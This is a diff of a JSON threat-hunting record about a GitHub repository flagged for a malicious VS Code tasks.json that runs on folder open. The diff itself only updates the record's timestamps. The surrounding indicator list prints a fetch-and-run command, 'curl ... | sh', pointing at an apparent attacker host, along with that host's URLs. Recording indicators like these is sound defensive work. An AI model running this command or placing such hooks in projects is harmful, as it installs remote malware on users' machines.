@@ -21,8 +21,8 @@
     "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 13)",
     "osm_status": "not_submitted",
     "osm_threat_id": "",
-    "first_seen": "hunt-20260925T173032Z",
-    "last_seen": "hunt-20260925T173032Z",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
     "evidence_file": "repositories/agrawalchirag_corex.json",
     "reviewer_decision": "",
     "notes": ""
@@ -84,7 +84,7 @@
     "evidence_references": "https://github.com/agrawalchirag/corex/blob/437614a8b223180db5caea8636dd4ad81406ace0/.vscode/tasks.json\nhttps://github.com/agrawalchirag/corex/blob/437614a8b223180db5caea8636dd4ad81406ace0/postcss.config.js#L6",
     "verified_iocs": "vscode-helper171.vercel.app\nhttps://vscode-helper171.vercel.app/settings/mac?flag=4\nhttps://vscode-helper171.vercel.app/settings/linux?flag=4\nhttps://vscode-helper171.vercel.app/settings/windows\ncurl 'https://vscode-helper171.vercel.app/settings/mac?flag=4' | sh\n.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-25T17:30:32Z",
-    "last_seen": "2026-09-25T17:30:32Z"
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
   }
 }
